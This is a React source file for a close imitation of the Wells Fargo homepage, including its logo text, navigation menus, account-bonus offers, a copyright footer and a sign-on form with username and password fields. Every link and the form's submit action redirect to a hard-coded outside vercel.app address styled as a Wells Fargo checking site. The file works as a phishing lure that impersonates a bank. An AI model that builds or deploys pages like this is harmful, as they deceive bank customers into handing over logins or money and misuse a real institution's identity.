/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState } from 'react';
import { Search, MapPin, HelpCircle, ChevronRight, Eye, EyeOff, ShieldAlert, Info } from 'lucide-react';

const REDIRECT_URL = "https://wellsfargopremiumchecking.vercel.app/";

const Header = () => {
  return (
    <header className="w-full">
      {/* Top Bar */}
      <div className="bg-[#D71E28] text-white py-2 px-4 md:px-8 flex justify-between items-center">
        <div className="flex items-center gap-6">
          <h1 className="text-2xl md:text-3xl font-bold tracking-tighter italic">WELLS FARGO</h1>
        </div>
        <div className="flex items-center gap-4 text-xs md:text-sm font-medium">
          <a href={REDIRECT_URL} className="hover:underline flex items-center gap-1">ATMs/Locations</a>
          <a href={REDIRECT_URL} className="hover:underline flex items-center gap-1">Help</a>
          <a href={REDIRECT_URL} className="hover:underline">Español</a>
          <button className="p-1 hover:bg-white/10 rounded-full">
            <Search size={18} />
          </button>
          <a href={REDIRECT_URL} className="bg-white text-[#D71E28] px-4 py-1.5 rounded-full font-bold hover:bg-gray-100 transition-colors">
            Sign On
          </a>
        </div>
      </div>

      {/* Main Nav */}
      <nav className="bg-white border-b border-gray-200">
        <div className="px-4 md:px-8 flex overflow-x-auto no-scrollbar">
          {['Personal', 'Investing & Wealth Management', 'Business', 'Commercial Banking', 'Corporate & Investment Banking', 'About Wells Fargo'].map((item, i) => (
            <a
              key={item}
              href={REDIRECT_URL}
              className={`px-4 py-4 text-sm font-bold whitespace-nowrap border-b-4 transition-colors ${
                i === 0 ? 'border-[#D71E28] text-gray-900' : 'border-transparent text-gray-600 hover:text-gray-900'
              }`}
            >
              {item}
            </a>
          ))}
        </div>
      </nav>

      {/* Sub Nav */}
      <nav className="bg-[#F4F4F4] border-b border-gray-200">
        <div className="px-4 md:px-8 flex overflow-x-auto no-scrollbar py-3 gap-6">
          {['Checking', 'Savings & CDs', 'Credit Cards', 'Home Loans', 'Personal Loans', 'Auto Loans', 'Premier', 'Education & Tools'].map((item) => (
            <a key={item} href={REDIRECT_URL} className="text-sm font-medium text-gray-700 hover:underline whitespace-nowrap">
              {item}
            </a>
          ))}
        </div>
      </nav>
    </header>
  );
};

const SignOnBox = () => {
  const [showPassword, setShowPassword] = useState(false);

  return (
    <div className="bg-white p-6 rounded-xl shadow-xl border border-gray-100 w-full max-w-sm">
      <h2 className="text-2xl font-semibold text-gray-800 mb-1">Good afternoon</h2>
      <p className="text-sm text-gray-500 mb-6 font-medium">Sign on to manage your accounts.</p>
      
      <form className="space-y-6" onSubmit={(e) => { e.preventDefault(); window.location.href = REDIRECT_URL; }}>
        <div className="relative">
          <input
            type="text"
            placeholder="Username"
            className="w-full border-b-2 border-gray-300 py-2 focus:border-[#D71E28] outline-none transition-colors text-gray-800"
          />
        </div>
        <div className="relative">
          <input
            type={showPassword ? "text" : "password"}
            placeholder="Password"
            className="w-full border-b-2 border-gray-300 py-2 focus:border-[#D71E28] outline-none transition-colors text-gray-800 pr-12"
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-0 top-2 text-[#4867AA] text-sm font-bold hover:underline"
          >
            {showPassword ? "Hide" : "Show"}
          </button>
        </div>
        
        <div className="flex items-center gap-2">
          <input type="checkbox" id="save-user" className="w-5 h-5 accent-[#D71E28]" />
          <label htmlFor="save-user" className="text-sm text-gray-700 font-medium">Save username</label>
        </div>

        <div className="flex items-center gap-4 pt-2">
          <button type="submit" className="bg-[#D71E28] text-white px-8 py-3 rounded-full font-bold hover:bg-[#B51922] transition-colors flex-1">
            Sign On
          </button>
          <a href={REDIRECT_URL} className="text-[#4867AA] font-bold hover:underline">Enroll</a>
        </div>
      </form>

      <div className="mt-8 pt-6 border-t border-gray-100 space-y-3">
        <a href={REDIRECT_URL} className="block text-sm text-[#4867AA] font-medium hover:underline">Sign on with a passkey</a>
        <a href={REDIRECT_URL} className="block text-sm text-[#4867AA] font-medium hover:underline">Forgot username or password?</a>
        <a href={REDIRECT_URL} className="block text-sm text-[#4867AA] font-medium hover:underline">Privacy, Cookies, and Legal</a>
      </div>
    </div>
  );
};

const Hero = () => {
  return (
    <section className="relative bg-white py-12 px-4 md:px-8 lg:px-16 overflow-hidden">
      <div className="max-w-7xl mx-auto flex flex-col lg:flex-row items-center lg:items-start gap-12">
        <SignOnBox />
        
        <div className="flex-1 py-8">
          <h2 className="text-5xl md:text-6xl font-bold text-gray-900 mb-6 leading-tight">
            $325 checking <br /> bonus on us
          </h2>
          <p className="text-xl text-gray-700 mb-8 max-w-lg">
            New customers open an eligible checking account with qualifying direct deposits
          </p>
          <a href={REDIRECT_URL} className="inline-flex border-2 border-gray-900 text-gray-900 px-8 py-3 rounded-full font-bold hover:bg-gray-50 transition-all items-center gap-2">
            Get started <ChevronRight size={20} />
          </a>

          <div className="mt-16 relative">
             <div className="inline-block border-l-4 border-[#D71E28] pl-6 py-2">
                <span className="text-sm font-bold uppercase tracking-widest text-[#D71E28]">Enjoy</span>
                <div className="text-7xl font-bold text-purple-800">$325</div>
             </div>
          </div>
        </div>
      </div>
    </section>
  );
};

const FeatureCard = ({ title, description, linkText, icon: Icon, colorClass = "text-purple-700" }) => (
  <div className="bg-white p-8 rounded-xl border border-gray-100 shadow-sm hover:shadow-md transition-shadow flex flex-col h-full">
    <div className={`mb-6 ${colorClass}`}>
      <Icon size={40} strokeWidth={1.5} />
    </div>
    <h3 className="text-xl font-bold text-gray-900 mb-3">{title}</h3>
    <p className="text-gray-600 mb-6 flex-grow leading-relaxed">{description}</p>
    <a href={REDIRECT_URL} className="text-[#4867AA] font-bold flex items-center gap-1 hover:underline">
      {linkText} <ChevronRight size={18} />
    </a>
  </div>
);

const GuidanceCard = ({ image, title, description, buttonText }) => (
  <div className="bg-white rounded-2xl overflow-hidden border border-gray-100 shadow-sm hover:shadow-md transition-all group">
    <div className="h-56 overflow-hidden">
      <img src={image} alt={title} className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500" referrerPolicy="no-referrer" />
    </div>
    <div className="p-8">
      <h3 className="text-2xl font-bold text-gray-900 mb-4">{title}</h3>
      <p className="text-gray-600 mb-8 leading-relaxed">{description}</p>
      <a href={REDIRECT_URL} className="inline-block border border-gray-900 px-6 py-2.5 rounded-full font-bold hover:bg-gray-900 hover:text-white transition-colors">
        {buttonText}
      </a>
    </div>
  </div>
);

export default function App() {
  return (
    <div className="min-h-screen bg-[#F9F9F9] font-sans text-gray-900">
      <Header />
      
      <main>
        <Hero />

        {/* Feature Grid */}
        <section className="py-16 px-4 md:px-8 lg:px-16 max-w-7xl mx-auto">
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
            <FeatureCard 
              title="Earn 60,000 bonus points"
              description="when you spend $4,000 in purchases in the first 3 months. Terms apply."
              linkText="Learn more"
              icon={() => (
                <div className="w-12 h-8 border-2 border-purple-700 rounded-md relative">
                   <div className="absolute top-1 left-1 w-2 h-1 bg-purple-700 rounded-sm"></div>
                </div>
              )}
            />
            <FeatureCard 
              title="New customer? Say hello to a $125 bonus"
              description="Open a Clear Access Banking account, great for students & more, complete offer requirements"
              linkText="See offer details"
              icon={() => (
                <div className="w-12 h-12 flex items-center justify-center">
                   <div className="w-10 h-6 border-2 border-red-700 relative">
                      <div className="absolute -top-3 left-1/2 -translate-x-1/2 w-0 h-0 border-l-[12px] border-l-transparent border-r-[12px] border-r-transparent border-b-[12px] border-b-red-700"></div>
                   </div>
                </div>
              )}
              colorClass="text-red-700"
            />
            <FeatureCard 
              title="Open a savings account"
              description="Explore our savings accounts and find the right fit for you"
              linkText="Get started"
              icon={() => (
                <div className="w-12 h-12 flex items-center justify-center">
                   <div className="w-10 h-8 border-2 border-pink-600 rounded-full relative">
                      <div className="absolute -top-1 right-2 w-2 h-2 bg-pink-600 rounded-full"></div>
                   </div>
                </div>
              )}
              colorClass="text-pink-600"
            />
            <FeatureCard 
              title="Interest rates today"
              description="Check current rates for mortgage, auto loans, and more."
              linkText="Check rates"
              icon={() => (
                <div className="w-12 h-12 flex items-center justify-center">
                   <div className="text-4xl font-bold text-orange-600">%</div>
                </div>
              )}
              colorClass="text-orange-600"
            />
          </div>
        </section>

        {/* One Key Banner */}
        <section className="bg-[#FDF6F0] py-16 px-4 md:px-8 lg:px-16">
          <div className="max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-8">
            <div className="max-w-xl">
              <h2 className="text-4xl font-bold text-gray-900 mb-6">Earn up to $350 in One Key rewards</h2>
              <p className="text-lg text-gray-700 mb-8">
                Use rewards on eligible bookings on Expedia®, Hotels.com®, and Vrbo®. Terms apply.
              </p>
              <a href={REDIRECT_URL} className="inline-block bg-gray-900 text-white px-8 py-3 rounded-full font-bold hover:bg-gray-800 transition-colors">
                Learn more
              </a>
            </div>
            <div className="flex items-center gap-4">
               <span className="text-2xl font-bold italic text-gray-800">WELLS FARGO | OneKey</span>
               <div className="flex -space-x-4">
                  <div className="w-32 h-20 bg-blue-900 rounded-lg shadow-lg transform -rotate-6"></div>
                  <div className="w-32 h-20 bg-gray-800 rounded-lg shadow-lg"></div>
               </div>
            </div>
          </div>
        </section>

        {/* Financial Guidance */}
        <section className="py-20 px-4 md:px-8 lg:px-16 max-w-7xl mx-auto">
          <h2 className="text-4xl font-bold text-center text-gray-900 mb-16">Financial guidance and support</h2>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            <GuidanceCard 
              image="https://images.unsplash.com/photo-1560518883-ce09059eeffa?auto=format&fit=crop&w=800&q=80"
              title="Borrowing built around you"
              description="Discover borrowing designed for every step of your journey"
              buttonText="Explore borrowing"
            />
            <GuidanceCard 
              image="https://images.unsplash.com/photo-1556742044-3c52d6e88c62?auto=format&fit=crop&w=800&q=80"
              title="Savings you can count on"
              description="Discover how smart saving moves you closer to your goals"
              buttonText="Grow your savings"
            />
            <GuidanceCard 
              image="https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&w=800&q=80"
              title="Fraud & Scam Alert"
              description="Spot the latest tactics scammers are using and stay protected"
              buttonText="Get the latest"
            />
          </div>
        </section>

        {/* Community Section */}
        <section className="py-20 px-4 md:px-8 lg:px-16 bg-white border-t border-gray-100">
          <div className="max-w-7xl mx-auto grid grid-cols-1 md:grid-cols-2 gap-12">
            <div className="space-y-6">
              <div className="aspect-video rounded-2xl overflow-hidden">
                <img src="https://images.unsplash.com/photo-1593113598332-cd288d649433?auto=format&fit=crop&w=800&q=80" alt="Community" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
              </div>
              <h3 className="text-3xl font-bold text-gray-900">Who we are</h3>
              <p className="text-gray-600 text-lg leading-relaxed">
                Wells Fargo helps strengthen communities through inclusion, economic empowerment, and sustainability.
              </p>
            </div>
            <div className="space-y-6">
              <div className="aspect-video rounded-2xl overflow-hidden">
                <img src="https://images.unsplash.com/photo-1531482615713-2afd69097998?auto=format&fit=crop&w=800&q=80" alt="Team" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
              </div>
              <h3 className="text-3xl font-bold text-gray-900">Why we're committed to communities</h3>
              <p className="text-gray-600 text-lg leading-relaxed">
                We don't just serve our communities—we are our communities. We're committed to helping customers and neighborhoods across the country thrive.
              </p>
            </div>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer className="bg-[#333333] text-white py-12 px-4 md:px-8 lg:px-16">
        <div className="max-w-7xl mx-auto">
          <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-8 mb-12">
            <div className="space-y-4">
              <h4 className="font-bold uppercase text-xs tracking-widest text-gray-400">About Wells Fargo</h4>
              <ul className="space-y-2 text-sm">
                <li><a href={REDIRECT_URL} className="hover:underline">Careers</a></li>
                <li><a href={REDIRECT_URL} className="hover:underline">Corporate Social Responsibility</a></li>
                <li><a href={REDIRECT_URL} className="hover:underline">Newsroom</a></li>
              </ul>
            </div>
            {/* Add more footer columns as needed */}
          </div>
          <div className="pt-8 border-t border-gray-700 text-xs text-gray-400 flex flex-col md:flex-row justify-between gap-4">
            <p>© 1999 - 2026 Wells Fargo. All rights reserved. NMLSR ID 399801</p>
            <div className="flex gap-4">
              <a href={REDIRECT_URL} className="hover:underline">Privacy, Cookies, Security & Legal</a>
              <a href={REDIRECT_URL} className="hover:underline">Notice of Data Collection</a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
